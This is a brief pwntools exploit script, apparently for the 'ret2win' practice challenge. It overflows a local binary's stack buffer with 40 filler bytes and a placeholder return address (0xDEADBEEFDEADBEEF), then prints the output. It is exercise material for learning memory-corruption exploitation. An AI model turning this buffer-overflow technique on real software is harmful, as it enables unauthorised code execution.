from pwn import *

exe = ELF("./ret2win", checksec=False)
p = process(exe.path)

payload = b'A' * 40
payload += p64(0xDEADBEEFDEADBEEF)

p.sendlineafter(':', payload)

output = p.recvall().decode(errors="ignore")
print(output)